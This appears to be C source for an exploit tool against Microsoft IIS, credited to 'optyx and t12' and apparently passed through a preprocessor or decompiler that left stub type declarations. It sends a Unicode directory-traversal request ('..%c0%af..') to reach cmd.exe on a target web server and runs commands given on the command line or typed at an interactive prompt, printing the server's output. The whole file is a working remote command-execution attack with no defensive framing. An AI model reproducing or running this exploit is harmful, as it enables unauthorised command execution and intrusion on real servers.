
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int s_addr ;
typedef int request ;
typedef int host ;
typedef int cmd ;


 int IPPROTO_TCP ;
 int PF_INET ;
 int SOCK_STREAM ;
 int alarm (int) ;
 int atoi (char*) ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 int * fgets (char*,int,int ) ;
 int fprintf (int ,char*,...) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int) ;
 int memcpy (char*,char*,int) ;
 int printf (char*,...) ;
 scalar_t__ recv (int,char*,int,int ) ;
 int send (int,char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int stderr ;
 int stdin ;
 int strcmp (char*,char*) ;
 int strlen (char*) ;
 int strncat (char*,char*,int) ;
 int strncpy (char*,char*,int) ;
 int usage () ;

int main(int argc, char **argv)
{
 int i, j;
 int port=80;
 int timeout=3;
 int interactive=0;
 char temp[1];
 char host[512]="";
 char cmd[1024]="";
 char request[8192]="GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+";
 struct hostent *he;
 struct sockaddr_in s_addr;

 printf("iis-zank_bread_chafer_8000_super_alpha_hyper_pickle.c\n");
 printf("by optyx and t12\n");

 for(i=0;i<argc;i++)
 { if(argv[i][0] == '-') {
   for(j=1;j<strlen(argv[i]);j++)
    {
    switch(argv[i][j])
     {
     case 't':
      strncpy(host, argv[i+1], sizeof(host));
      break;
     case 'c':
      strncpy(cmd, argv[i+1], sizeof(cmd));
      break;
     case 'h':
      usage();
       break;
     case 'o':
     timeout=atoi(argv[i+1]);
      break;
     case 'p':
      port=atoi(argv[i+1]);
      break;
     case 'i':
      interactive=1;
      break;
     default:
     break;
    }
   }
  }
 }

 if(!strcmp(host, ""))
 {
  fprintf(stderr, "specify target host\n");
  usage();
 }

 if(!strcmp(cmd, "") && !interactive)
 {
  fprintf(stderr, "specify command to execute\n");
  usage();
 }

 printf("]- Target - %s:%d\n", host, port);
 if(!interactive)
   printf("]- Command - %s\n", cmd);
 printf("]- Timeout - %d seconds\n", timeout);
 if((he=gethostbyname(host)) == ((void*)0))
 {
   fprintf(stderr, "invalid target\n");
  usage();
 }

 do
  {

  if(interactive)
    {
    cmd[0]=0;
    printf("\nC> ");
    if(fgets(cmd, sizeof(cmd), stdin) == ((void*)0))
       fprintf(stderr, "gets() error\n");
    cmd[strlen(cmd)-1]='\0';
    if(!strcmp("exit", cmd))
       exit(-1);
   }

   for(i=0;i<strlen(cmd);i++)
   {
     if(cmd[i]==' ')
     cmd[i]='+';
   }

  strncpy(request,
     "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+",
     sizeof(request));
   strncat(request, cmd, sizeof(request) - strlen(request));
   strncat(request, "\n", sizeof(request) - strlen(request));

   s_addr.sin_family = PF_INET;
   s_addr.sin_port = htons(port);
   memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr,
   sizeof(s_addr.sin_addr));

   if((i=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
   {
     fprintf(stderr, "cannot create socket\n");
     exit(-1);
   }

   alarm(timeout);
   j = connect(i, (struct sockaddr *) &s_addr, sizeof(s_addr));
   alarm(0);

   if(j==-1)
   {
     fprintf(stderr, "cannot connect to %s\n", host);
     exit(-1);
     close(i);
   }

  if(!interactive)
      printf("]- Sending request: %s\n", request);

   send(i, request, strlen(request), 0);

  if(!interactive)
      printf("]- Getting results\n");

   while(recv(i,temp,1, 0)>0)
   {
            alarm(timeout);
     printf("%c", temp[0]);
            alarm(0);
   }

  }
  while(interactive);

  close(i);
  return 0;
}
